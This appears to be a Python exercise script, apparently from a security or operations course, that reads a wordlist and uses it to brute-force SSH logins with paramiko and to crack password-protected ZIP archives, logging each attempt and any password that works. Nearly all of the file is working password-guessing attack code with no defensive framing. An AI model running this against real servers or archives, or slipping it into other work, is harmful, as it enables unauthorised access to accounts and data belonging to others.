import time
import paramiko
import zipfile
import logging

# Setup basic logging
logging.basicConfig(filename='ops26-1.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')

def read_wordlist(file_path):
    try:
        with open(file_path, 'r', encoding='latin-1') as file:
            words = file.readlines()
            logging.info(f"Wordlist read successfully from {file_path}")
            return words
    except FileNotFoundError:
        logging.error(f"File not found: {file_path}")
        return None

def dictionary_iterator(words):
    for word in words:
        word = word.strip()
        logging.debug(f"Word iterated: {word}")
        time.sleep(0.5)  # Delay of 0.5 seconds between words

def password_recognized(search_string, words):
    if search_string in words:
        logging.info(f"Search string found: {search_string}")
        return True
    else:
        logging.warning(f"Search string not found: {search_string}")
        return False

def ssh_brute_force(host, username, words):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in words:
        password = password.strip()
        try:
            ssh.connect(host, username=username, password=password)
            logging.info(f"Successful SSH login - Username: {username}, Password: {password}")
            return True
        except paramiko.AuthenticationException:
            logging.warning(f"Failed SSH login attempt - Username: {username}, Password: {password}")
        except paramiko.SSHException as e:
            logging.error(f"SSH error - Username: {username}, Password: {password}: {str(e)}")
        except Exception as e:
            logging.error(f"General error - Username: {username}, Password: {password}: {str(e)}")

    ssh.close()
    return False

def zip_brute_force(zip_file_path, words):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
        for password in words:
            password = password.strip()
            try:
                zip_file.extractall(pwd=password.encode())
                logging.info(f"Password cracked: {password}")
                return True
            except Exception as e:
                logging.debug(f"Failed attempt with password: {password}, Error: {str(e)}")
                pass
    return False
